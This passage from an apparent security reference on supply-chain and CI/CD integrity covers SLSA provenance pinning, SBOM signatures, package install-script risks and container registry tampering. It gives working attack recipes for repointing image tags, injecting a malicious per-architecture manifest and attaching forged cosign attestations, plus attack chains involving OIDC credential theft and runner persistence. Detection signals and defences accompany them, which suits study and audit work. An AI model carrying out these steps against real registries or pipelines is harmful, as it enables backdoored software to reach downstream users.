**Measured** (`.zen-batch-artifacts/batch-16/measure/04-sbom-and-provenance-shape.output.txt`): naive verifier pinning `subject[0].name` + `builder.id` accepts a tampered provenance whose `externalParameters.workflow.repository` was swapped. Strict verifier (pins `workflow.repository` + `workflow.path` + `ref`) rejects it.

**Correct pinning for GitHub Actions SLSA Level 3 provenance:**

| Field | Pin to | Why |
|---|---|---|
| `subject[*].digest.sha256` | Artifact's actual digest | Prevents swap |
| `predicate.buildDefinition.externalParameters.workflow.repository` | `https://github.com/acme/service` | Prevents attacker-fork publishing |
| `predicate.buildDefinition.externalParameters.workflow.path` | `.github/workflows/release.yml` | Prevents arbitrary-workflow publishing |
| `predicate.buildDefinition.externalParameters.workflow.ref` | `refs/heads/main` or a tag glob | Prevents feature-branch publishing |
| `predicate.runDetails.builder.id` | `https://github.com/actions/runner/github-hosted@v1` | Prevents self-hosted-runner builds |

### Sub-primitive 2 — slsa-verifier Invocation

```bash
# Correct — pins source and ref
slsa-verifier verify-artifact \
  --provenance-path provenance.json \
  --source-uri github.com/acme/service \
  --source-branch main \
  artifact.tar.gz
```

Common misuse: omitting `--source-branch`, which allows provenance from any branch (including attacker-pushed feature branches on main).

### Sub-primitive 3 — SBOM Format Specifics

**CycloneDX.** The signature over the BOM document (`vexJsonSigned` or detached signature) is optional. SBOM consumers that read `components[*]` without verifying a detached signature trust the SBOM producer's identity by name only.

**SPDX.** `creationInfo.creator` is a string; `creationInfo.licenseListVersion` is informational. The signature is a detached PGP signature; verification is manual.

**Confirmation signals.**
1. SBOM consumer reads `components[*].name` + `components[*].version` without a cryptographic signature check.
2. SBOM document is not accompanied by a detached signature.
3. `components[*].externalReferences[*]` includes `vcs` URLs that are not verified against the organization's canonical URL list.

## Build-System Install-Script Primitives — Per-Ecosystem

### npm — postinstall / preinstall / prepare / install

**Primitive.** Every `npm install` runs every lockfile-resolved package's lifecycle scripts (unless `--ignore-scripts` is set). `postinstall` is the most common vector; `preinstall` fires earlier; `prepare` fires on `npm pack` and `npm publish` (and `npm install` for git deps). `install` fires if `scripts.install` is set.

**Confirmation signals.**
1. `--ignore-scripts` NOT set in CI (`npm ci --ignore-scripts` is the hardened form).
2. `.npmrc` lacks `ignore-scripts=true`.
3. pnpm's `onlyBuiltDependencies` not configured.

### Python — setup.py install + PEP 517 build backends

**Primitive.** Legacy `setup.py` runs at install time with full Python privilege. PEP 517 backends still execute arbitrary Python during wheel build. Even wheels — supposedly binary distributions — can execute at install time if the wheel contains a `.data/scripts/` file with a shebang.

**Confirmation signals.**
1. `pip install --no-build-isolation` used, which runs build scripts in the user environment.
2. `pip install --require-hashes` NOT used.
3. `pip` NOT invoked with `--only-binary :all:` for pure-Python wheels — meaning sdist may be chosen.

### Cargo — build.rs + [build-dependencies]

**Primitive.** `build.rs` is Rust code that runs at build time. `[build-dependencies]` are downloaded and compiled during the same step. `cargo build` runs them with no sandbox.

**Confirmation signals.**
1. Lockfile pins a crate whose source has `build.rs` with network calls or filesystem writes outside `OUT_DIR`.
2. `[build-dependencies]` section pins a crate from a lightly-maintained author.

### Ruby — gem native extensions

**Primitive.** `gem install` runs `extconf.rb` + `make` for native-extension gems. The `require` of the gem additionally runs any `init.rb`-style code.

### Composer — scripts.post-install-cmd

**Primitive.** `composer install` runs `scripts.post-install-cmd`, `post-update-cmd`, `post-package-install`, `post-package-update`. All at full PHP privilege.

### Mitigation — the Only Reliable Pattern

Pre-review every lifecycle script before adoption; pin by hash (lockfile integrity); audit lockfile diffs on PRs; use `--ignore-scripts` + explicit allowlist in CI (`pnpm`'s `onlyBuiltDependencies`, `npm`'s manual exceptions); run installs in an isolated environment with no secrets.

## Container Registry Manifest Tampering

### Sub-primitive 1 — Tag Repoint

**Primitive.** Tags are mutable. Pull by tag retrieves whichever manifest the registry currently serves for that tag. Attacker with push rights replaces `:latest`, `:v1`, or `:stable` with a malicious image; every deployer pulling that tag receives the malicious manifest on the next pull.

**Attack recipe (push side).**
```bash
# Attacker has registry push privilege via leaked token, misconfigured IAM, or
# compromised CI job. The push repoints an existing tag.
docker build -t ghcr.io/acme/svc:v1 -f Dockerfile.malicious .
docker push ghcr.io/acme/svc:v1
# Any `docker pull ghcr.io/acme/svc:v1` after this point retrieves the malicious manifest.
```

**Attack recipe (consumer side — the vulnerable pattern).**
```yaml
# Kubernetes Deployment pulling by tag
spec:
  containers:
  - image: ghcr.io/acme/svc:v1     # ← mutable; attacker-rewritable
    imagePullPolicy: Always        # ← triggers pull on every pod restart
```

Combined with `imagePullPolicy: Always` and a pod restart (via rolling update, OOMKill, node drain), the attacker's manifest reaches production without a deployment change.

**Confirmation signals (tag repoint).**
1. Any Dockerfile, `docker-compose.yml`, Kubernetes manifest, or Helm chart with `image: *:tag` where tag is not a digest.
2. Registry does NOT have tag immutability enabled: `aws ecr describe-repositories --query 'repositories[*].imageTagMutability'` returns `MUTABLE` (default); GHCR org policy not set.
3. Registry push log shows a tag updated to a new manifest digest without a corresponding git tag/release.
4. Image deployed to production carries a build timestamp that doesn't match any released commit.

### Sub-primitive 2 — Manifest-List Injection

**Primitive.** An OCI manifest list (fat manifest, `application/vnd.docker.distribution.manifest.list.v2+json` or `application/vnd.oci.image.index.v1+json`) points to per-architecture manifests. Attacker who controls one architecture's manifest can serve a malicious image to that architecture while leaving others clean — evades spot-checks on `amd64` while compromising `arm64`, or vice versa.

**Attack recipe.**
```bash
# Build a manifest list where arm64 points to an attacker-controlled image
# while amd64 keeps the clean image
docker manifest create ghcr.io/acme/svc:v1 \
  --amend ghcr.io/acme/svc:v1-amd64-clean \
  --amend ghcr.io/malicious/svc:latest-arm64

docker manifest annotate ghcr.io/acme/svc:v1 \
  ghcr.io/malicious/svc:latest-arm64 --os linux --arch arm64

docker manifest push ghcr.io/acme/svc:v1
```

A security review that pulls on `amd64` sees the clean image; `arm64` nodes get the malicious one.

**Confirmation signals (manifest-list injection).**
1. `docker manifest inspect <image>:<tag>` lists per-architecture digests that have different signers or build origins.
2. SLSA provenance exists for `amd64` manifest digest but not for `arm64` (or vice versa).
3. Registry push history shows separate pushes to per-arch manifests before the manifest-list update.

### Sub-primitive 3 — Blob Substitution

**Primitive.** Image layers (blobs) are content-addressed by SHA256. A tampered blob with a different SHA256 produces a different manifest digest, so direct blob substitution with a different content cannot replace an existing manifest's reference. **Attacks here require registry-level write to the manifest OR a hash collision**; blob substitution alone is not a primitive. The real attack is manifest-level: push a new manifest that references attacker-provided blobs, then repoint the tag to the new manifest (Sub-primitive 1).

**The one case where blob control matters standalone**: a registry mirror / caching proxy that serves blobs without verifying the SHA256 — a classic ETag/If-None-Match caching proxy that doesn't understand OCI's content-addressing. The attack is on the proxy, not the registry; see `cloud/*` for pull-through-cache analysis.

### Sub-primitive 4 — OCI Referrer Manipulation

**Primitive.** The OCI Image Spec v1.1 referrers API (`GET /v2/<name>/referrers/<digest>`) lists artifacts (attestations, SBOMs, signatures) that reference a given manifest. An attacker who adds a referrer that points at an attacker-produced attestation can confuse consumers that fetch "the latest attestation for this image" rather than enumerating and verifying all referrers' identities.

**Attack recipe.** Attacker has push privilege to any namespace in the registry — not necessarily the victim's namespace. Attacker pushes an attestation artifact whose `subject.digest` matches the victim image's digest. The referrers API now lists two attestations for the image: the real one (signed by the project) and the attacker's.

```bash
# Attacker-side: push attestation targeting a victim image's digest
cosign attest --predicate=my-fake-predicate.json \
  --type=https://in-toto.io/attestation/vuln/v0.1 \
  --key=my-attacker-key.pem \
  --annotations=role=security-review \
  ghcr.io/attacker-namespace/placeholder@sha256:<VICTIM_IMAGE_DIGEST>
# The referrer is now attached to the victim image's digest.
```

A naive consumer: `cosign tree ghcr.io/acme/svc:v1` lists both attestations; `cosign verify-attestation` with a loose policy may accept the attacker's.

**Confirmation signals (OCI referrer manipulation).**
1. `cosign tree <image>` or `oras discover <image>` lists referrers from multiple namespaces or with non-project keyless identities.
2. Consumer scripts call `cosign verify-attestation` without `--certificate-identity` + `--certificate-oidc-issuer`.
3. Consumer scripts fetch "the first" attestation rather than enumerating + verifying all.
4. Registry allows cross-namespace referrer attachment (default on most registries).

### Correct Defense

- Pull by digest, never by tag, in Dockerfiles and deployment manifests.
- Admission controller (Kyverno `verifyImages` or Portieris) that requires signature verification before pod start.
- Registry access control: no public push rights for internal namespaces; audit `RepositoryPolicy` on ECR and `permissions.pulls`/`permissions.push` on GHCR.
- Enable image-tag immutability on registries that support it (ECR `imageTagMutability: IMMUTABLE`, GHCR via organization policy).

## Chaining — Composite Attack Paths

### Chain 1 — Maintainer Phish → Published Malware → OIDC → Cloud Takeover

1. Attacker phishes a maintainer (routes to `authentication_jwt.md` for the token-theft class).
2. Attacker publishes a malicious version of the maintainer's package.
3. CI runs `npm install`; postinstall executes.
4. Postinstall queries OIDC federation for AWS credentials (this file — claim-validation gap).
5. Attacker uses credentials to push a backdoored artifact to S3 (routes to `cloud/aws.md`).

### Chain 2 — pwn-Request → GITHUB_TOKEN Elevation → Repo Tag Repoint

1. Attacker opens a PR with a malicious title (this file — script injection).
2. `pull_request_target` workflow runs with `permissions: write-all`.
3. `GITHUB_TOKEN` has repo-write.
4. Attacker's step uses the token to force-push a tag at a backdoored commit.
5. Downstream consumers pulling `@v1` get the backdoor.

### Chain 3 — Cache Poisoning → Project-Signed Backdoor

1. Attacker's PR workflow poisons `actions/cache` (this file — cache poisoning).
2. Main-branch release workflow restores the cache.
3. Release workflow builds, signs with Sigstore keyless, publishes to registry.
4. Signature is valid; identity is `release.yml@main`; content is attacker-controlled.
5. Downstream `cosign verify` with correct identity pinning *still passes*. The chain evades identity-pinning because the project itself is the signer.
6. The only defense is reproducible builds + per-input provenance that includes the cache source — SLSA L3 territory.

### Chain 4 — Dependency Confusion → Self-Hosted Runner Backdoor

1. Attacker publishes a dependency-confusion package (this file — dependency confusion).
2. Developer runs `npm install` on a workstation OR a CI runs `npm install` on a self-hosted runner.
3. Postinstall sets `RUNNER_TRACKING_ID=0` and spawns a persistence process (this file — self-hosted runner persistence).
4. The runner survives job completion; attacker has long-lived access to a host inside the corporate network (routes to `cloud/*` or network-pivot analysis).

## Verification Discipline — Per-Primitive

- **Dependency confusion**: show both the attacker's publish URL AND the resolver log line selecting it. A theoretical "name is unregistered on public npm" is a precondition, not a finding.
- **Script injection**: identify the specific context field AND the specific `run:` sink, with no `env:` binding between them. An expression in `env:` or `with:` is a different attack class and needs a different sink.
- **Cache poisoning**: identify the cache-writing workflow AND the cache-reading workflow AND the key collision AND the restored content's execution path.
- **Self-hosted runner persistence**: show the runner is non-ephemeral AND show the attacker-reachable workflow AND verify the specific persistence mechanism (RUNNER_TRACKING_ID bypass, bashrc write, cron, systemd unit).
- **OIDC claim gap**: fetch the actual trust policy AND confirm the missing or over-broad condition AND verify the policy applies to a role with meaningful permissions.
- **Code-signing bypass**: produce a crafted bundle that the verifier accepts in a non-production environment. Theoretical "the verifier does not pin X" is a hypothesis; a reproducing bundle is the finding.
- **SBOM / provenance poisoning**: construct a tampered document AND run the organization's verifier against it. Field-pinning policy is checked by invoking the policy with a modified document.
- **Container tag mutation**: show both the Dockerfile / manifest using a mutable tag AND evidence (git history, deployment manifests) that the tag is in production use.

## Load this file when…

- The report calls for a specific attack-recipe depth (actionable publishing steps for dependency confusion, a working pwn-request payload, a cache-poisoning timeline, an OIDC exploitation protocol).
- A finding spans multiple primitives and requires composite-chain decomposition.
- The verifier wants to reproduce a theoretical cosign / slsa-verifier / cache-poisoning bypass against a sandbox.
- Choosing between competing primitives on a target that exposes several (dependency confusion vs typosquatting vs maintainer-phish; pull_request_target vs cache poisoning vs OIDC).

## Summary

Supply-chain and CI/CD integrity attacks at advanced depth operate on seven primitive families with concrete recipes: dependency confusion (per-registry resolution-order protocols); GitHub Actions pwn-request (`pull_request_target` + fork-ref checkout, `${{ }}` script injection into `run:`, composite action pass-through, Marketplace tag mutability); Actions cache poisoning (shared-cache cross-branch, poisoned-cache-restored-into-signed-build); self-hosted runner escape (RUNNER_TRACKING_ID bypass, non-ephemeral reuse, lateral into cloud metadata); OIDC federation claim gaps (missing `sub` / wildcard `sub` / unscoped `job_workflow_ref` per cloud); code-signing / sigstore bypass (keyless without identity pin, legacy-bundle public-key fallback, Rekor-entry disassociation, policy-regex permissiveness); SBOM / SLSA provenance poisoning (field-pinning gaps, verifier-policy omissions); and container-registry tampering (mutable tags, manifest-list injection, OCI referrer manipulation). Confirmation signals are the specific trust-policy JSON, workflow YAML, cosign-verify flag set, and resolver log line. The 2024–2026 CVE and incident catalog — tj-actions, reviewdog, ultralytics, Nx, Shai-Hulud, Jenkins, TeamCity, Cosign — lives in `supply_chain_ci_integrity_novel_deep.md`.
